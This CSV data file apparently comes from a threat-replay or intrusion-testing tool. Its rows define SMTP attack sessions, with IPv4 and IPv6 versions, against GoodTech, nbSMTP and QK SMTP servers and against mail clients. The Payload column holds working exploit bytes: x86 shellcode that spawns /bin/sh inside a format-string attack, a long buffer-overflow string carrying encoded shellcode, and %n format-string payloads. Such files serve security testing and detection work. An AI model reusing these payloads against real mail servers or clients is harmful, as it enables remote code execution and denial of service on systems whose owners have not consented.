XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
goodtechSMTP.xml,GoodTech SMTP Server DoS,This threat causes the GoodTech SMTP server to crash by sending a poorly created RCPT TO field.  SMTP servers typically listen on port 25.,SMTP,TCP,250[[2d ]]SI[[5a ]]E 52428800[[0d 0a ]]250[[2d ]]PIPE[[4c ]]I[[4e ]]I[[4e ]]G[[0d 0a ]]250[[2d ]]AUTH P[[4c ]]AI[[4e ]] [[4c 4f ]]GI[[4e 0d 0a]]
goodtechSMTP.xml,GoodTech SMTP Server DoS,This threat causes the GoodTech SMTP server to crash by sending a poorly created RCPT TO field.  SMTP servers typically listen on port 25.,SMTP,TCP,250 [[4f 4b 0d 0a]]
goodtechSMTP.xml,GoodTech SMTP Server DoS,This threat causes the GoodTech SMTP server to crash by sending a poorly created RCPT TO field.  SMTP servers typically listen on port 25.,SMTP,TCP,250 Accepted[[0d 0a]]
goodtechSMTP.xml,GoodTech SMTP Server DoS,This threat causes the GoodTech SMTP server to crash by sending a poorly created RCPT TO field.  SMTP servers typically listen on port 25.,SMTP,TCP,"354 E[[6e ]]ter [[6d ]]essage[[2c ]] e[[6e ]]di[[6e ]]g with ""[[2e ]]"" [[6f 6e ]] a [[6c ]]i[[6e ]]e by itse[[6c ]]f[[0d 0a]]"
goodtechSMTP.xml,GoodTech SMTP Server DoS,This threat causes the GoodTech SMTP server to crash by sending a poorly created RCPT TO field.  SMTP servers typically listen on port 25.,SMTP,TCP,250 [[4f 4b ]] id[[3d ]]1HcVW[[6f 2d ]]0007YR[[2d ]]S8
goodtechSMTP.xml,GoodTech SMTP Server DoS,This threat causes the GoodTech SMTP server to crash by sending a poorly created RCPT TO field.  SMTP servers typically listen on port 25.,SMTP,TCP,221 f[[6f ]]ster c[[6c 6f ]]si[[6e ]]g c[[6f 6e 6e ]]ecti[[6f 6e 0d 0a]]
﻿goodtechSMTP_IPv6.xml,GoodTech SMTP Server DoS (IPv6 Version),This threat causes the GoodTech SMTP server to crash by sending a poorly created RCPT TO field.  SMTP servers typically listen on port 25. (IPv6 Version),SMTP/IPv6,TCP,220 f[[6f ]]ster ES[[4d ]]TP[[0d 0a]]
goodtechSMTP_IPv6.xml,GoodTech SMTP Server DoS (IPv6 Version),This threat causes the GoodTech SMTP server to crash by sending a poorly created RCPT TO field.  SMTP servers typically listen on port 25. (IPv6 Version),SMTP/IPv6,TCP,250[[2d ]]SI[[5a ]]E 52428800[[0d 0a ]]250[[2d ]]PIPE[[4c ]]I[[4e ]]I[[4e ]]G[[0d 0a ]]250[[2d ]]AUTH P[[4c ]]AI[[4e ]] [[4c 4f ]]GI[[4e 0d 0a]]
goodtechSMTP_IPv6.xml,GoodTech SMTP Server DoS (IPv6 Version),This threat causes the GoodTech SMTP server to crash by sending a poorly created RCPT TO field.  SMTP servers typically listen on port 25. (IPv6 Version),SMTP/IPv6,TCP,250 [[4f 4b 0d 0a]]
goodtechSMTP_IPv6.xml,GoodTech SMTP Server DoS (IPv6 Version),This threat causes the GoodTech SMTP server to crash by sending a poorly created RCPT TO field.  SMTP servers typically listen on port 25. (IPv6 Version),SMTP/IPv6,TCP,250 Accepted[[0d 0a]]
goodtechSMTP_IPv6.xml,GoodTech SMTP Server DoS (IPv6 Version),This threat causes the GoodTech SMTP server to crash by sending a poorly created RCPT TO field.  SMTP servers typically listen on port 25. (IPv6 Version),SMTP/IPv6,TCP,"354 E[[6e ]]ter [[6d ]]essage[[2c ]] e[[6e ]]di[[6e ]]g with ""[[2e ]]"" [[6f 6e ]] a [[6c ]]i[[6e ]]e by itse[[6c ]]f[[0d 0a]]"
goodtechSMTP_IPv6.xml,GoodTech SMTP Server DoS (IPv6 Version),This threat causes the GoodTech SMTP server to crash by sending a poorly created RCPT TO field.  SMTP servers typically listen on port 25. (IPv6 Version),SMTP/IPv6,TCP,250 [[4f 4b ]] id[[3d ]]1HcVW[[6f 2d ]]0007YR[[2d ]]S8
goodtechSMTP_IPv6.xml,GoodTech SMTP Server DoS (IPv6 Version),This threat causes the GoodTech SMTP server to crash by sending a poorly created RCPT TO field.  SMTP servers typically listen on port 25. (IPv6 Version),SMTP/IPv6,TCP,221 f[[6f ]]ster c[[6c 6f ]]si[[6e ]]g c[[6f 6e 6e ]]ecti[[6f 6e 0d 0a]]
﻿nbSMTP_fmt.xml,nbSMTP Format String Overflow,This threat sends a malicious message from one SMTP server to another.  This malicious message is a format string attack that attacks the logging functionality of the no-brainer SMTP server.  This threat is a client attack that comes from the virtual server.  SMTP typically listens on port 25.,SMTP,TCP,220[[0A]]
nbSMTP_fmt.xml,nbSMTP Format String Overflow,This threat sends a malicious message from one SMTP server to another.  This malicious message is a format string attack that attacks the logging functionality of the no-brainer SMTP server.  This threat is a client attack that comes from the virtual server.  SMTP typically listens on port 25.,SMTP,TCP,250[[0A]]
nbSMTP_fmt.xml,nbSMTP Format String Overflow,This threat sends a malicious message from one SMTP server to another.  This malicious message is a format string attack that attacks the logging functionality of the no-brainer SMTP server.  This threat is a client attack that comes from the virtual server.  SMTP typically listens on port 25.,SMTP,TCP,553 xx[[08 04 D4 D4 08 04 D4 D6 90 90 90 90 ]]jfXj[[01 ]][[[99 ]]RSj[[02 89 E1 CD 80 ]]RCh[[FF 02 13 D2 89 E1 ]]j[[10 ]]QP[[89 E1 89 C6 B0 ]]f[[CD 80 ]]CC[[B0 ]]f[[CD 80 ]]RV[[89 E1 ]]C[[B0 ]]f[[CD 80 89 D9 89 C3 B0 ]]?I[[CD 80 ]]A[[E2 F8 ]]Rhn/shh//bi[[89 E3 ]]RS[[89 E1 B0 0B CD 80 ]]%12627u%7$n%54850u%8$n[[0A]]
﻿nbSMTP_fmt_IPv6.xml,nbSMTP Format String Overflow (IPv6 Version),This threat sends a malicious message from one SMTP server to another.  This malicious message is a format string attack that attacks the logging functionality of the no-brainer SMTP server.  This threat is a client attack that comes from the virtual server.  SMTP typically listens on port 25. (IPv6 Version),SMTP/IPv6,TCP,220[[0A]]
nbSMTP_fmt_IPv6.xml,nbSMTP Format String Overflow (IPv6 Version),This threat sends a malicious message from one SMTP server to another.  This malicious message is a format string attack that attacks the logging functionality of the no-brainer SMTP server.  This threat is a client attack that comes from the virtual server.  SMTP typically listens on port 25. (IPv6 Version),SMTP/IPv6,TCP,250[[0A]]
nbSMTP_fmt_IPv6.xml,nbSMTP Format String Overflow (IPv6 Version),This threat sends a malicious message from one SMTP server to another.  This malicious message is a format string attack that attacks the logging functionality of the no-brainer SMTP server.  This threat is a client attack that comes from the virtual server.  SMTP typically listens on port 25. (IPv6 Version),SMTP/IPv6,TCP,553 xx[[08 04 D4 D4 08 04 D4 D6 90 90 90 90 ]]jfXj[[01 ]][[[99 ]]RSj[[02 89 E1 CD 80 ]]RCh[[FF 02 13 D2 89 E1 ]]j[[10 ]]QP[[89 E1 89 C6 B0 ]]f[[CD 80 ]]CC[[B0 ]]f[[CD 80 ]]RV[[89 E1 ]]C[[B0 ]]f[[CD 80 89 D9 89 C3 B0 ]]?I[[CD 80 ]]A[[E2 F8 ]]Rhn/shh//bi[[89 E3 ]]RS[[89 E1 B0 0B CD 80 ]]%12627u%7$n%54850u%8$n[[0A]]
﻿qksmtp_bof.xml,QK SMTP Remote Buffer Overflow Vulnerability,"This threat uses a specially crafted ""rcpt to"" command issued to a vulnerable server to execute  arbitrary code. QK SMTP server typically listens on port 25.",SMTP,TCP,helo acaro[[0D 0A]]
qksmtp_bof.xml,QK SMTP Remote Buffer Overflow Vulnerability,"This threat uses a specially crafted ""rcpt to"" command issued to a vulnerable server to execute  arbitrary code. QK SMTP server typically listens on port 25.",SMTP,TCP,mail from: acaro.peace[[0D 0A]]
qksmtp_bof.xml,QK SMTP Remote Buffer Overflow Vulnerability,"This threat uses a specially crafted ""rcpt to"" command issued to a vulnerable server to execute  arbitrary code. QK SMTP server typically listens on port 25.",SMTP,TCP,rcpt to: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[[8F ]])F[[00 ]]ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssPPYAIAIAIAIAIAIAIAIAIAIAIAIAIAIAjXAQADAZABARALAYAIAQAIAQAIAhAAAZ1AIAIAJ11AIAIABABABQI1AIQIAIQI111AIAJQYAZBABABABABkMAGB9u4JBYlQZjKNmiXkIyokOkOOptKplmTo4RkQ5oL2kCLm5PxkQJORkPOLX4KOoKpIqjKOYtKP4DKkQZNp1upryVLqtWP44LGWQgZjmjaXBJKL4MkntktnHt5IURkqOnDkQzKqVRkLLNkRkQOMLM1xkm3NLTKQyBLO4mLoqy3lqIK34rkmsLptKQ0LL4KppmL4mdKMpKXOnaX4N0NLNjLNpKOz6ovOcRFOxlsOBphSGRSoBaOOdkOXPRH8KjMKLOKpPkO6vQOTIXeOve1JMm8JbnuqZKRkOHPbH7izizUvMPWYo6vnsOcQCb3PSMsNsOSNskOfp1VqXLQ1LrFnsu99QTUQXTdMJ2PewqGkOVvqZZpnqPUkOXPph3tTmNNZINwKO6vns0UKO6pOxIUoYBfa9r7Yo6vb00TOdR5YoHP3cRHgwRYGVbYnwkOJ6OeyoJ0s60j1T36OxqSrMU9jEozPPPYNIxLQyzGrJmtriYRnQGPZSdjkNORlmynMrnL63BmPznXvKFKVKqXPrKNvSMFyoD5Mtyo6vqKPWPRPQoaNqbJkQpQpQoepQKOfpOxtmz9m58NNsiovv2JYoyoLw9oVpDK27ilqsvds4KOWfpRkOvpOxhp1zitOonsKOyFKO6pAEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEPsTsXs[[B0 ]]Hs[[B0 ]]Hs[[B0 ]]Hs[[B0 ]]Hs[[B0 ]]Hs[[B0 ]]Hs[[B0 ]]Hs[[B0 ]]Hs[[B0 ]]Hs[[B0 ]]Hs[[B0 ]]Hs[[B0 ]]Hs[[B0 ]]Hs@s@s@s@s@s@s@sPs[[C3 ]]s[[00 0D 0A]]
qksmtp_bof.xml,QK SMTP Remote Buffer Overflow Vulnerability,"This threat uses a specially crafted ""rcpt to"" command issued to a vulnerable server to execute  arbitrary code. QK SMTP server typically listens on port 25.",SMTP,TCP,220 f[[6f ]]ster ES[[4d ]]TP[[0d 0a]]
qksmtp_bof.xml,QK SMTP Remote Buffer Overflow Vulnerability,"This threat uses a specially crafted ""rcpt to"" command issued to a vulnerable server to execute  arbitrary code. QK SMTP server typically listens on port 25.",SMTP,TCP,250[[2d ]]SI[[5a ]]E 52428800[[0d 0a ]]250[[2d ]]PIPE[[4c ]]I[[4e ]]I[[4e ]]G[[0d 0a ]]250[[2d ]]AUTH P[[4c ]]AI[[4e ]] [[4c 4f ]]GI[[4e 0d 0a]]
qksmtp_bof.xml,QK SMTP Remote Buffer Overflow Vulnerability,"This threat uses a specially crafted ""rcpt to"" command issued to a vulnerable server to execute  arbitrary code. QK SMTP server typically listens on port 25.",SMTP,TCP,250 [[4f 4b 0d 0a]]
qksmtp_bof.xml,QK SMTP Remote Buffer Overflow Vulnerability,"This threat uses a specially crafted ""rcpt to"" command issued to a vulnerable server to execute  arbitrary code. QK SMTP server typically listens on port 25.",SMTP,TCP,250 Accepted[[0d 0a]]
qksmtp_bof.xml,QK SMTP Remote Buffer Overflow Vulnerability,"This threat uses a specially crafted ""rcpt to"" command issued to a vulnerable server to execute  arbitrary code. QK SMTP server typically listens on port 25.",SMTP,TCP,"354 E[[6e ]]ter [[6d ]]essage[[2c ]] e[[6e ]]di[[6e ]]g with ""[[2e ]]"" [[6f 6e ]] a [[6c ]]i[[6e ]]e by itse[[6c ]]f[[0d 0a]]"
qksmtp_bof.xml,QK SMTP Remote Buffer Overflow Vulnerability,"This threat uses a specially crafted ""rcpt to"" command issued to a vulnerable server to execute  arbitrary code. QK SMTP server typically listens on port 25.",SMTP,TCP,250 [[4f 4b ]] id[[3d ]]1HcVW[[6f 2d ]]0007YR[[2d ]]S8
qksmtp_bof.xml,QK SMTP Remote Buffer Overflow Vulnerability,"This threat uses a specially crafted ""rcpt to"" command issued to a vulnerable server to execute  arbitrary code. QK SMTP server typically listens on port 25.",SMTP,TCP,221 f[[6f ]]ster c[[6c 6f ]]si[[6e ]]g c[[6f 6e 6e ]]ecti[[6f 6e 0d 0a]]
﻿qksmtp_bof_IPv6.xml,QK SMTP Remote Buffer Overflow Vulnerability (IPv6 Version),"This threat uses a specially crafted ""rcpt to"" command issued to a vulnerable server to execute  arbitrary code. QK SMTP server typically listens on port 25. (IPv6 Version)",SMTP/IPv6,TCP,helo acaro[[0D 0A]]
qksmtp_bof_IPv6.xml,QK SMTP Remote Buffer Overflow Vulnerability (IPv6 Version),"This threat uses a specially crafted ""rcpt to"" command issued to a vulnerable server to execute  arbitrary code. QK SMTP server typically listens on port 25. (IPv6 Version)",SMTP/IPv6,TCP,mail from: acaro.peace[[0D 0A]]
qksmtp_bof_IPv6.xml,QK SMTP Remote Buffer Overflow Vulnerability (IPv6 Version),"This threat uses a specially crafted ""rcpt to"" command issued to a vulnerable server to execute  arbitrary code. QK SMTP server typically listens on port 25. (IPv6 Version)",SMTP/IPv6,TCP,rcpt to: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[[8F ]])F[[00 ]]ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssPPYAIAIAIAIAIAIAIAIAIAIAIAIAIAIAjXAQADAZABARALAYAIAQAIAQAIAhAAAZ1AIAIAJ11AIAIABABABQI1AIQIAIQI111AIAJQYAZBABABABABkMAGB9u4JBYlQZjKNmiXkIyokOkOOptKplmTo4RkQ5oL2kCLm5PxkQJORkPOLX4KOoKpIqjKOYtKP4DKkQZNp1upryVLqtWP44LGWQgZjmjaXBJKL4MkntktnHt5IURkqOnDkQzKqVRkLLNkRkQOMLM1xkm3NLTKQyBLO4mLoqy3lqIK34rkmsLptKQ0LL4KppmL4mdKMpKXOnaX4N0NLNjLNpKOz6ovOcRFOxlsOBphSGRSoBaOOdkOXPRH8KjMKLOKpPkO6vQOTIXeOve1JMm8JbnuqZKRkOHPbH7izizUvMPWYo6vnsOcQCb3PSMsNsOSNskOfp1VqXLQ1LrFnsu99QTUQXTdMJ2PewqGkOVvqZZpnqPUkOXPph3tTmNNZINwKO6vns0UKO6pOxIUoYBfa9r7Yo6vb00TOdR5YoHP3cRHgwRYGVbYnwkOJ6OeyoJ0s60j1T36OxqSrMU9jEozPPPYNIxLQyzGrJmtriYRnQGPZSdjkNORlmynMrnL63BmPznXvKFKVKqXPrKNvSMFyoD5Mtyo6vqKPWPRPQoaNqbJkQpQpQoepQKOfpOxtmz9m58NNsiovv2JYoyoLw9oVpDK27ilqsvds4KOWfpRkOvpOxhp1zitOonsKOyFKO6pAEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEPsTsXs[[B0 ]]Hs[[B0 ]]Hs[[B0 ]]Hs[[B0 ]]Hs[[B0 ]]Hs[[B0 ]]Hs[[B0 ]]Hs[[B0 ]]Hs[[B0 ]]Hs[[B0 ]]Hs[[B0 ]]Hs[[B0 ]]Hs[[B0 ]]Hs@s@s@s@s@s@s@sPs[[C3 ]]s[[00 0D 0A]]
qksmtp_bof_IPv6.xml,QK SMTP Remote Buffer Overflow Vulnerability (IPv6 Version),"This threat uses a specially crafted ""rcpt to"" command issued to a vulnerable server to execute  arbitrary code. QK SMTP server typically listens on port 25. (IPv6 Version)",SMTP/IPv6,TCP,220 f[[6f ]]ster ES[[4d ]]TP[[0d 0a]]
qksmtp_bof_IPv6.xml,QK SMTP Remote Buffer Overflow Vulnerability (IPv6 Version),"This threat uses a specially crafted ""rcpt to"" command issued to a vulnerable server to execute  arbitrary code. QK SMTP server typically listens on port 25. (IPv6 Version)",SMTP/IPv6,TCP,250[[2d ]]SI[[5a ]]E 52428800[[0d 0a ]]250[[2d ]]PIPE[[4c ]]I[[4e ]]I[[4e ]]G[[0d 0a ]]250[[2d ]]AUTH P[[4c ]]AI[[4e ]] [[4c 4f ]]GI[[4e 0d 0a]]
qksmtp_bof_IPv6.xml,QK SMTP Remote Buffer Overflow Vulnerability (IPv6 Version),"This threat uses a specially crafted ""rcpt to"" command issued to a vulnerable server to execute  arbitrary code. QK SMTP server typically listens on port 25. (IPv6 Version)",SMTP/IPv6,TCP,250 [[4f 4b 0d 0a]]
qksmtp_bof_IPv6.xml,QK SMTP Remote Buffer Overflow Vulnerability (IPv6 Version),"This threat uses a specially crafted ""rcpt to"" command issued to a vulnerable server to execute  arbitrary code. QK SMTP server typically listens on port 25. (IPv6 Version)",SMTP/IPv6,TCP,250 Accepted[[0d 0a]]
qksmtp_bof_IPv6.xml,QK SMTP Remote Buffer Overflow Vulnerability (IPv6 Version),"This threat uses a specially crafted ""rcpt to"" command issued to a vulnerable server to execute  arbitrary code. QK SMTP server typically listens on port 25. (IPv6 Version)",SMTP/IPv6,TCP,"354 E[[6e ]]ter [[6d ]]essage[[2c ]] e[[6e ]]di[[6e ]]g with ""[[2e ]]"" [[6f 6e ]] a [[6c ]]i[[6e ]]e by itse[[6c ]]f[[0d 0a]]"
qksmtp_bof_IPv6.xml,QK SMTP Remote Buffer Overflow Vulnerability (IPv6 Version),"This threat uses a specially crafted ""rcpt to"" command issued to a vulnerable server to execute  arbitrary code. QK SMTP server typically listens on port 25. (IPv6 Version)",SMTP/IPv6,TCP,250 [[4f 4b ]] id[[3d ]]1HcVW[[6f 2d ]]0007YR[[2d ]]S8
qksmtp_bof_IPv6.xml,QK SMTP Remote Buffer Overflow Vulnerability (IPv6 Version),"This threat uses a specially crafted ""rcpt to"" command issued to a vulnerable server to execute  arbitrary code. QK SMTP server typically listens on port 25. (IPv6 Version)",SMTP/IPv6,TCP,221 f[[6f ]]ster c[[6c 6f ]]si[[6e ]]g c[[6f 6e 6e ]]ecti[[6f 6e 0d 0a]]
﻿smtpFormat.xml,SMTP Server Error Message Format String Overflow,"This threat mimics the behaviour of a malicious SMTP server attempting to crash or cause code execution on a mail client sending email.  This can be used with other attacks, such as redirection, to cause code execution on a client.  SMTP servers typically listen on port 25.  This threat is a client attack that comes from the virtual server.",SMTP,TCP,he[[6c 6f ]] [[6d ]]ai[[6c 0d 0a]]
smtpFormat.xml,SMTP Server Error Message Format String Overflow,"This threat mimics the behaviour of a malicious SMTP server attempting to crash or cause code execution on a mail client sending email.  This can be used with other attacks, such as redirection, to cause code execution on a client.  SMTP servers typically listen on port 25.  This threat is a client attack that comes from the virtual server.",SMTP,TCP,535 fai[[6c ]]ed %x%x%[[6e 0d 0a]]
﻿smtpFormat_IPv6.xml,SMTP Server Error Message Format String Overflow (IPv6 Version),"This threat mimics the behaviour of a malicious SMTP server attempting to crash or cause code execution on a mail client sending email.  This can be used with other attacks, such as redirection, to cause code execution on a client.  SMTP servers typically listen on port 25.  This threat is a client attack that comes from the virtual server. (IPv6 Version)",SMTP/IPv6,TCP,he[[6c 6f ]] [[6d ]]ai[[6c 0d 0a]]
smtpFormat_IPv6.xml,SMTP Server Error Message Format String Overflow (IPv6 Version),"This threat mimics the behaviour of a malicious SMTP server attempting to crash or cause code execution on a mail client sending email.  This can be used with other attacks, such as redirection, to cause code execution on a client.  SMTP servers typically listen on port 25.  This threat is a client attack that comes from the virtual server. (IPv6 Version)",SMTP/IPv6,TCP,535 fai[[6c ]]ed %x%x%[[6e 0d 0a]]
